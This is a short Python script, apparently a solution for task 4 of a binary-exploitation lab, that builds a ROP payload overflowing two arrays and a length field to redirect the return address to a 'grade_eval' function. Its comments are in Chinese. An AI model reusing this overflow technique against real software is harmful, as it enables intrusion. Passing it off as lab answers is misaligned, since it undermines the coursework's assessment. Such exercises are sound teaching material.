#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

def p64(x):
    return pack("<Q", x)

pop_rdi_ret = 0x4018a3
ret = 0x4018a4
grade_eval = 0x401677

# 放在 expression 中的 ROP 链
rop = p64(pop_rdi_ret)
rop += p64(4)
rop += p64(ret)          # 调整栈对齐
rop += p64(grade_eval)

# grade_eval 返回后尝试回到 main
rop += p64(0x401811)

# 填满两个数组
payload = rop.ljust(128, b"A")
payload += b"B" * 128

# 覆盖 len，使复制目标指向返回地址
payload += pack("<i", 0xa8)

sys.stdout.buffer.write(payload + b"\n")
